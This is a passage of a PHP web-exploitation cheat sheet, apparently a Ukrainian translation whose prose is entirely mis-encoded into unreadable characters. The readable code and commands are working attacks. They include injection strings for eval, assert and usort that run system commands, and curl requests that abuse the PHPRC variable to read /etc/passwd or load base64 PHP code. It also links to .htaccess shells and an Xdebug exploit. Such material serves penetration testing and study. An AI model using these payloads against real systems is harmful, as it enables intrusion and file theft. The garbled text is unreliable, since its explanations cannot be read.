* **PHPSESSION cookies —Ç—ñ—î—ó –∂ –¥–æ–º–µ–Ω—É –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ –æ–¥–Ω–æ–º—É –º—ñ—Å—Ü—ñ**, —Ç–æ–º—É —è–∫—â–æ –≤ –º–µ–∂–∞—Ö –¥–æ–º–µ–Ω—É **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —Ä—ñ–∑–Ω—ñ cookies –≤ —Ä—ñ–∑–Ω–∏—Ö —à–ª—è—Ö–∞—Ö**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ç–∞–∫, —â–æ–± —à–ª—è—Ö **–æ—Ç—Ä–∏–º—É–≤–∞–≤ –¥–æ—Å—Ç—É–ø –¥–æ cookie —à–ª—è—Ö—É**, –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—á–∏ –∑–Ω–∞—á–µ–Ω–Ω—è cookie —ñ–Ω—à–æ–≥–æ —à–ª—è—Ö—É.\
–¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ **–æ–±–∏–¥–≤–∞ —à–ª—è—Ö–∏ –æ—Ç—Ä–∏–º—É—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ –∑–º—ñ–Ω–Ω–æ—ó –∑ –æ–¥–Ω–∞–∫–æ–≤–æ—é –Ω–∞–∑–≤–æ—é**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ç–∞–∫, —â–æ–± **–∑–Ω–∞—á–µ–Ω–Ω—è —Ü—ñ—î—ó –∑–º—ñ–Ω–Ω–æ—ó –≤ path1 –∑–∞—Å—Ç–æ—Å–æ–≤—É–≤–∞–ª–æ—Å—è –¥–æ path2**. –ê –ø–æ—Ç—ñ–º path2 –±—É–¥–µ –≤–≤–∞–∂–∞—Ç–∏ –¥—ñ–π—Å–Ω–∏–º–∏ –∑–º—ñ–Ω–Ω—ñ path1 (–¥–∞–≤—à–∏ cookie –Ω–∞–∑–≤—É, —è–∫–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —ó–π –≤ path2).
* –ö–æ–ª–∏ —É –≤–∞—Å —î **—ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –º–∞—à–∏–Ω–∏. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∞–¥—Ä–µ—Å—É: **/\~\<USERNAME>**, —â–æ–± –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏, —á–∏ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω—ñ –∫–∞—Ç–∞–ª–æ–≥–∏ php.
* [**LFI —Ç–∞ RCE –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –æ–±–≥–æ—Ä—Ç–æ–∫ php**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

–¶—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ PHP –¥–ª—è **–≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —Ö–µ—à—ñ–≤ –≤—ñ–¥ –ø–∞—Ä–æ–ª—ñ–≤** —Ç–∞ –¥–ª—è **–ø–µ—Ä–µ–≤—ñ—Ä–∫–∏**, —á–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π –ø–∞—Ä–æ–ª—å –ø–æ—Ä—ñ–≤–Ω—è–Ω–æ –∑ —Ö–µ—à–µ–º.\
–ü—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ –∞–ª–≥–æ—Ä–∏—Ç–º–∏: `PASSWORD_DEFAULT` —Ç–∞ `PASSWORD_BCRYPT` (–ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ `$2y$`). –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **PASSWORD\_DEFAULT —á–∞—Å—Ç–æ —î —Ç–∞–∫–∏–º —Å–∞–º–∏–º, —è–∫ PASSWORD\_BCRYPT.** –Ü –Ω–∞—Ä–∞–∑—ñ **PASSWORD\_BCRYPT** –º–∞—î **–æ–±–º–µ–∂–µ–Ω–Ω—è —Ä–æ–∑–º—ñ—Ä—É –≤–≤–æ–¥—É 72 –±–∞–π—Ç–∏**. –¢–æ–º—É, –∫–æ–ª–∏ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –∑–≥–µ—à—Ç—É–≤–∞—Ç–∏ —â–æ—Å—å –±—ñ–ª—å—à–µ, –Ω—ñ–∂ 72 –±–∞–π—Ç–∏ –∑ —Ü–∏–º –∞–ª–≥–æ—Ä–∏—Ç–º–æ–º, –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –ª–∏—à–µ –ø–µ—Ä—à—ñ 72 –±–∞–π—Ç–∏:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### –û–±—Ö—ñ–¥ HTTP-–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –ø–æ–º–∏–ª–∫–∞–º–∏ PHP

–Ø–∫—â–æ **—Å—Ç–æ—Ä—ñ–Ω–∫–∞ PHP –≤–∏–≤–æ–¥–∏—Ç—å –ø–æ–º–∏–ª–∫–∏ —Ç–∞ –ø–æ–≤–µ—Ä—Ç–∞—î –¥–µ—è–∫–∏–π –≤–≤—ñ–¥, –Ω–∞–¥–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ —Å–µ—Ä–≤–µ—Ä PHP –≤–∏–≤–µ—Å—Ç–∏ –¥–µ—è–∫–∏–π **–≤–º—ñ—Å—Ç –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –¥–æ–≤–≥–∏–π**, —â–æ–± –ø—Ä–∏ —Å–ø—Ä–æ–±—ñ **–¥–æ–¥–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∏** –¥–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Å–µ—Ä–≤–µ—Ä –≤–∏–∫–∏–Ω—É–≤ –ø–æ–º–∏–ª–∫—É.\
–£ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º—É—Å–∏–≤ —Å–µ—Ä–≤–µ—Ä –≤–∏–∫–∏–Ω—É—Ç–∏ –¥–µ—è–∫—ñ –≤–µ–ª–∏–∫—ñ –ø–æ–º–∏–ª–∫–∏**, —ñ, —è–∫ –≤–∏–¥–Ω–æ –Ω–∞ –µ–∫—Ä–∞–Ω—ñ, –∫–æ–ª–∏ PHP —Å–ø—Ä–æ–±—É–≤–∞–≤ **–∑–º—ñ–Ω–∏—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∑–∞–≥–æ–ª–æ–≤–∫–∞, –≤—ñ–Ω –Ω–µ –∑–º—ñ–≥** (—Ç–∞–∫, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–∞–≥–æ–ª–æ–≤–æ–∫ CSP –Ω–µ –±—É–≤ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ):

![](<../../../.gitbook/assets/image (465).png>)

## –í–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ –¥–ª—è –±—ñ–ª—å—à –∫–æ—Ä–∏—Å–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
–î–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –≤ –∞—Ä–≥—É–º–µ–Ω—Ç—ñ "replace" –ø–æ—Ç—Ä—ñ–±–Ω–æ —â–æ–Ω–∞–π–º–µ–Ω—à–µ –æ–¥–Ω–µ —Å–ø—ñ–≤–ø–∞–¥—ñ–Ω–Ω—è. –¶—è –æ–ø—Ü—ñ—è preg\_replace –±—É–ª–∞ **–∑–∞—Å—Ç–∞—Ä—ñ–ª–æ—é –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ PHP 5.5.0.**

### **RCE —á–µ—Ä–µ–∑ Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE —á–µ—Ä–µ–∑ Assert()**

–¶—è —Ñ—É–Ω–∫—Ü—ñ—è –≤ php –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–¥, —è–∫–∏–π –Ω–∞–ø–∏—Å–∞–Ω–∏–π —É –≤–∏–≥–ª—è–¥—ñ —Ä—è–¥–∫–∞**, —â–æ–± **–ø–æ–≤–µ—Ä–Ω—É—Ç–∏ true –∞–±–æ false** (—ñ –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ —Ü—å–æ–≥–æ –∑–º—ñ–Ω–∏—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è). –ó–∞–∑–≤–∏—á–∞–π –∑–º—ñ–Ω–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –±—É–¥–µ –≤—Å—Ç–∞–≤–ª–µ–Ω–∞ –ø–æ—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ä—è–¥–∫–∞. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:\
`assert("strpos($_GET['page']),'..') === false")` --> –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **RCE** –≤–∏ –º–æ–≥–ª–∏ –± –∑—Ä–æ–±–∏—Ç–∏:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
–í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **—Ä–æ–∑—ñ–±—Ä–∞—Ç–∏** —Å–∏–Ω—Ç–∞–∫—Å–∏—Å –∫–æ–¥—É, **–¥–æ–¥–∞—Ç–∏** —Å–≤—ñ–π **–ø–µ–π–ª–æ—É–¥**, –∞ –ø–æ—Ç—ñ–º **–≤–∏–ø—Ä–∞–≤–∏—Ç–∏ –π–æ–≥–æ –∑–Ω–æ–≤—É**. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–ª–æ–≥—ñ—á–Ω—ñ –æ–ø–µ—Ä–∞—Ü—ñ—ó** —Ç–∞–∫—ñ —è–∫ "**and**" –∞–±–æ "**%26%26**" –∞–±–æ "**|**". –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ "or", "||" –Ω–µ –ø—Ä–∞—Ü—é—î, –æ—Å–∫—ñ–ª—å–∫–∏ —è–∫—â–æ –ø–µ—Ä—à–∞ —É–º–æ–≤–∞ —î —ñ—Å—Ç–∏–Ω–Ω–æ—é, –Ω–∞—à –ø–µ–π–ª–æ—É–¥ –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∏–π. –¢–∞–∫ —Å–∞–º–æ ";" –Ω–µ –ø—Ä–∞—Ü—é—î, –æ—Å–∫—ñ–ª—å–∫–∏ –Ω–∞—à –ø–µ–π–ª–æ—É–¥ –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∏–π.

**–Ü–Ω—à–∞ –æ–ø—Ü—ñ—è** - –¥–æ–¥–∞—Ç–∏ –¥–æ —Ä—è–¥–∫–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∏: `'.highlight_file('.passwd').'`

**–Ü–Ω—à–∞ –æ–ø—Ü—ñ—è** (—è–∫—â–æ —É –≤–∞—Å —î –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–π –∫–æ–¥) - –∑–º—ñ–Ω–∏—Ç–∏ –¥–µ—è–∫—É –∑–º—ñ–Ω–Ω—É –¥–ª—è –∑–º—ñ–Ω–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è: `$file = "hola"`

### **RCE —á–µ—Ä–µ–∑ usort()**

–¶—è —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Å–æ—Ä—Ç—É–≤–∞–Ω–Ω—è –º–∞—Å–∏–≤—É –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó.\
–î–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü—ñ—î—é —Ñ—É–Ω–∫—Ü—ñ—î—é:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **//** –¥–ª—è –∫–æ–º–µ–Ω—Ç—É–≤–∞–Ω–Ω—è —Ä–µ—à—Ç–∏ –∫–æ–¥—É.

–©–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –∫—ñ–ª—å–∫—ñ—Å—Ç—å –¥—É–∂–æ–∫, —è–∫—ñ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–∫—Ä–∏—Ç–∏:

* `?order=id;}//`: –º–∏ –æ—Ç—Ä–∏–º—É—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É (`Parse error: syntax error, unexpected ';'`). –ô–º–æ–≤—ñ—Ä–Ω–æ, –Ω–∞–º –Ω–µ –≤–∏—Å—Ç–∞—á–∞—î –æ–¥–Ω—ñ—î—ó –∞–±–æ –¥–µ–∫—ñ–ª—å–∫–æ—Ö –¥—É–∂–æ–∫.
* `?order=id);}//`: –º–∏ –æ—Ç—Ä–∏–º—É—î–º–æ **–ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è**. –°—Ö–æ–∂–µ, —â–æ –≤—Å–µ –≤—ñ—Ä–Ω–æ.
* `?order=id));}//`: –º–∏ –æ—Ç—Ä–∏–º—É—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É (`Parse error: syntax error, unexpected ')' i`). –ô–º–æ–≤—ñ—Ä–Ω–æ, —É –Ω–∞—Å –∑–∞–Ω–∞–¥—Ç–æ –±–∞–≥–∞—Ç–æ –∑–∞–∫—Ä–∏–≤–∞—é—á–∏—Ö –¥—É–∂–æ–∫.

### **RCE —á–µ—Ä–µ–∑ .httaccess**

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** —Ñ–∞–π–ª **.htaccess**, —Ç–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏** –∫—ñ–ª—å–∫–∞ —Ä–µ—á–µ–π —ñ –Ω–∞–≤—ñ—Ç—å –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥ (–Ω–∞–ª–∞—à—Ç–æ–≤—É—é—á–∏ —Ñ–∞–π–ª–∏ –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º .htaccess –º–æ–∂–Ω–∞ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏**).

–†—ñ–∑–Ω—ñ –æ–±–æ–ª–æ–Ω–∫–∏ .htaccess –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://github.com/wireghoul/htshells)

### RCE —á–µ—Ä–µ–∑ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º **–∑–º—ñ–Ω—é–≤–∞—Ç–∏ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –≤ PHP** (—ñ —â–µ –æ–¥–Ω—É –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, —Ö–æ—á–∞ –∑ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–º–∏ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è–º–∏, –º–æ–∂–ª–∏–≤–æ, —Ü–µ –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏), –≤–∏ –º–æ–∂–µ—Ç–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü–∏–º –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): –¶—è –∑–º—ñ–Ω–Ω–∞ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –ø—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ —ñ–Ω—à–∏—Ö –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ (—Ö–æ—á–∞ –≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É —Ü–µ –º–æ–∂–µ –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏).
* **`PHPRC`** : –í–∫–∞–∑—É—î PHP, **–¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –π–æ–≥–æ —Ñ–∞–π–ª –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó**, –∑–∞–∑–≤–∏—á–∞–π –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è `php.ini`. –Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤–ª–∞—Å–Ω–∏–π —Ñ–∞–π–ª –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó, —Ç–æ–¥—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `PHPRC`, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ PHP –Ω–∞ –Ω—å–æ–≥–æ. –î–æ–¥–∞–π—Ç–µ –∑–∞–ø–∏—Å **`auto_prepend_file`**, –≤–∫–∞–∑–∞–≤—à–∏ –¥—Ä—É–≥–∏–π –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π —Ñ–∞–π–ª. –¶–µ–π –¥—Ä—É–≥–∏–π —Ñ–∞–π–ª –º—ñ—Å—Ç–∏—Ç—å –∑–≤–∏—á–∞–π–Ω–∏–π **PHP-–∫–æ–¥, —è–∫–∏–π –ø–æ—Ç—ñ–º –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è** –≤–∏–∫–æ–Ω–∞–≤—á–∏–º —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ–º PHP –ø–µ—Ä–µ–¥ –±—É–¥—å-—è–∫–∏–º —ñ–Ω—à–∏–º –∫–æ–¥–æ–º.
1. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Ñ–∞–π–ª PHP, —â–æ –º—ñ—Å—Ç–∏—Ç—å –Ω–∞—à –∫–æ–¥ –æ–±–æ–ª–æ–Ω–∫–∏
2. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –¥—Ä—É–≥–∏–π —Ñ–∞–π–ª, —â–æ –º—ñ—Å—Ç–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–∏–≤—É **`auto_prepend_file`**, —è–∫–∞ –≤–∫–∞–∑—É—î –ø—Ä–µ–ø—Ä–æ—Ü–µ—Å–æ—Ä—É PHP –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ñ–∞–π–ª, —è–∫–∏–π –º–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–ª–∏ –Ω–∞ –∫—Ä–æ—Ü—ñ 1
3. –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –∑–º—ñ–Ω–Ω—É `PHPRC` –Ω–∞ —Ñ–∞–π–ª, —è–∫–∏–π –º–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–ª–∏ –Ω–∞ –∫—Ä–æ—Ü—ñ 2.
* –û—Ç—Ä–∏–º–∞–π—Ç–µ –±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü—ñ—î—ó –ª–∞–Ω—Ü—é–≥–æ–≤–æ—ó —Ä–µ–∞–∫—Ü—ñ—ó [**–∑ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ –∑–≤—ñ—Ç—É**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - —â–µ –æ–¥–∏–Ω –≤–∞—Ä—ñ–∞–Ω—Ç
* –Ø–∫—â–æ –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤ FreeBSD "—Ñ–∞–π–ª" `/dev/fd/0`, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å **`stdin`**, —è–∫ **—Ç—ñ–ª–æ** –∑–∞–ø–∏—Ç—É, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ–≥–æ –¥–æ `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* –ê–±–æ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE, —É–≤—ñ–º–∫–Ω—ñ—Ç—å **`allow_url_include`** —Ç–∞ –¥–æ–¥–∞–π—Ç–µ —Ñ–∞–π–ª –∑ **–∫–æ–¥–æ–º PHP —É base64**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* –¢–µ—Ö–Ω—ñ–∫–∞ [**–∑ —Ü—å–æ–≥–æ –∑–≤—ñ—Ç—É**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## –°—Ç–∞—Ç–∏—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑ PHP

–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤—Å—Ç–∞–≤–∏—Ç–∏ –∫–æ–¥ —É –≤–∏–∫–ª–∏–∫–∏ —Ü–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π (–∑ [—Ç—É—Ç](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
–Ø–∫—â–æ –≤–∏ –≤—ñ–¥–ª–∞–∂—É—î—Ç–µ –¥–æ–¥–∞—Ç–æ–∫ –Ω–∞ PHP, –≤–∏ –º–æ–∂–µ—Ç–µ –≥–ª–æ–±–∞–ª—å–Ω–æ —É–≤—ñ–º–∫–Ω—É—Ç–∏ –≤–∏–≤–µ–¥–µ–Ω–Ω—è –ø–æ–º–∏–ª–æ–∫ –≤ `/etc/php5/apache2/php.ini`, –¥–æ–¥–∞–≤—à–∏ `display_errors = On`, —Ç–∞ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–∏ apache: `sudo systemctl restart apache2`

### –†–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è PHP-–∫–æ–¥—É

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–≤–µ–±-—Å–∞–π—Ç** [**www.unphp.net**](http://www.unphp.net) **–¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è php-–∫–æ–¥—É.**

## –û–±–≥–æ—Ä—Ç–∫–∏ —Ç–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ PHP

–û–±–≥–æ—Ä—Ç–∫–∏ —Ç–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ PHP –º–æ–∂—É—Ç—å –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–∞–º **–æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç –≤—ñ–¥ –∑–∞–ø–∏—Å—É —Ç–∞ —á–∏—Ç–∞–Ω–Ω—è** –≤ —Å–∏—Å—Ç–µ–º—ñ —Ç–∞ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —ó—ó. –î–ª—è [**–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug –Ω–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π RCE

–Ø–∫—â–æ –≤–∏ –±–∞—á–∏—Ç–µ, —â–æ **Xdebug** **—É–≤—ñ–º–∫–Ω–µ–Ω–æ** —É –≤–∏–≤–µ–¥–µ–Ω–Ω—ñ `phpconfig()`, –≤–∞–º —Å–ª—ñ–¥ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE —á–µ—Ä–µ–∑ [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## –ó–º—ñ–Ω–Ω—ñ –∑–º—ñ–Ω–Ω—ñ
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è RCE —á–µ—Ä–µ–∑ –Ω–æ–≤–∏–π $\_GET\["a"]\($\_GET\["b"])

–Ø–∫—â–æ –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –≤–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π –æ–±'—î–∫—Ç –±—É–¥—å-—è–∫–æ–≥–æ –∫–ª–∞—Å—É**, –≤–∏, –º–æ–∂–ª–∏–≤–æ, –∑–º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è —è–∫:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

